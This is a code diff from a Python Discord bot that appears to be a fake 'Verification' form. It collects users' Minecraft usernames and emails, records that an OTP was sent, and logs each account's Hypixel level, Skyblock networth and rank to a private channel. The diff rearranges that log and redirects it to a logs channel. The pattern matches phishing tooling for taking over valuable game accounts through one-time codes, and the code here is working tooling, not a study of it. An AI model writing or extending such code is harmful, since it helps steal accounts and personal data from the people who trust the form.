@@ -123,7 +123,8 @@ class MyModalOne(ui.Modal, title="Verification"):
             colour=0xEE4B2B,  
         )
         embed_sucess = discord.Embed (
-                title="Account Log",
+                title=f"{interaction.user.name} | {interaction.user.id}",
+                description=f"**Username | Email | Status**\n```{self.username.value} | {self.email.value} | Sent OTP!```",
                 timestamp= datetime.datetime.now(),
                 colour=0x088F8F,                           
         )
@@ -134,12 +135,8 @@ class MyModalOne(ui.Modal, title="Verification"):
         
         # User Data
         embed_sucess.add_field(name="**Hypixel Level**:", value=f"{player_info["playerlvl"]}", inline=True)
-        embed_sucess.add_field(name="**:moneybag: Skyblock Networth**:", value=f"{player_info["nw"]}", inline=True)
-        embed_sucess.add_field(name="**:mortar_board: Rank**:", value=f"{player_info["rank"]}", inline=True)
-        embed_sucess.add_field(name="**Username**:", value=f"```{self.username.value}```", inline=False)
-        embed_sucess.add_field(name="**Email**:", value=f"```{self.email.value}```", inline=False)
-        embed_sucess.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
-        embed_sucess.add_field(name="**Capes**:", value=f"{player_info['cape_url']}", inline=False)
+        embed_sucess.add_field(name="**Skyblock Networth**:", value=f"{player_info["nw"]}", inline=True)
+        embed_sucess.add_field(name="**Rank**:", value=f"{player_info["rank"]}", inline=True)
         data.LastUsedEmail = self.email.value
             
         if Flagx == True:
@@ -147,7 +144,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         if FlagNx == True:
             await logs_channel.send(embed = embedfalsenone)
 
-        await accounts_channel.send(embed = embed_sucess)
+        await logs_channel.send(embed = embed_sucess)
 
         await interaction.followup.send(
             embed = discord.Embed (
